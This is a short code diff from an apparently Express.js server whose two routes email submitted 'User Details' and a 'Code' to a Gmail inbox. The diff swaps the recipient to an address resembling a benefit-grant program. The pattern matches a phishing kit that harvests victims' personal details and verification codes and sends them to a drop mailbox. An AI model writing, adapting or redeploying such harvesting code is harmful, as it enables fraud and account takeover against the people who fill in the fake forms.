@@ -28,7 +28,7 @@ app.post('/', async(req,res)=>{
 
     const mailOptions = {
         from: 'RESULT <unk23099@gmail.com>',
-        to: 'johncuff101@gmail.com',
+        to: 'idabenefitgrantprogram@gmail.com',
         subject: 'User Details',
         html: html
 
@@ -62,7 +62,7 @@ app.post('/code', async(req,res)=>{
 
     const mailOptions = {
         from: 'RESULT <unk23099@gmail.com>',
-        to: 'johncuff101@gmail.com',
+        to: 'idabenefitgrantprogram@gmail.com',
         subject: 'Code',
         html: html
 
